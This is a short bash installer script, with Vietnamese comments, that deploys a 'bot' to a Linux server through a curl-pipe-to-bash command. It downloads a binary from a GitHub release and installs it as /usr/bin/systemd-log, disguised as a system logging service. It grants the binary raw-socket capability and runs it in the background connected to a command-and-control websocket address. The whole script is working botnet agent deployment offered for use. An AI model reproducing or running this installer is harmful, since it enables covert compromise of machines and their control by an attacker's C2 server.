#!/bin/bash
# ============================================================
# BOT DEPLOYER — Cài bot lên VPS Linux qua 1 lệnh curl
# ============================================================
# Cách dùng:
#   curl -sL https://raw.githubusercontent.com/YOUR_ORG/bot/main/install.sh | bash -s wss://your-c2.com/ws/bot/
# ============================================================
set -e

C2_URL="${1:-wss://your-c2-domain.com/ws/bot/}"
GITHUB_REPO="YOUR_ORG/bot"
BOT_PATH="/usr/bin/systemd-log"

echo "[*] Downloading latest bot..."
LATEST=$(curl -s "https://api.github.com/repos/$GITHUB_REPO/releases/latest" | grep '"tag_name"' | head -1 | cut -d'"' -f4)
curl -sL "https://github.com/$GITHUB_REPO/releases/download/$LATEST/bot_static" -o /tmp/bot_update
chmod +x /tmp/bot_update

echo "[*] Installing..."
systemctl stop systemd-log.service 2>/dev/null || true
killall systemd-log 2>/dev/null || true
mv /tmp/bot_update "$BOT_PATH"
chmod +x "$BOT_PATH"
setcap cap_net_raw+ep "$BOT_PATH" 2>/dev/null || true

echo "[*] Starting bot..."
nohup "$BOT_PATH" "$C2_URL" &>/dev/null &

echo "[+] Bot installed and running."
echo "[+] C2: $C2_URL"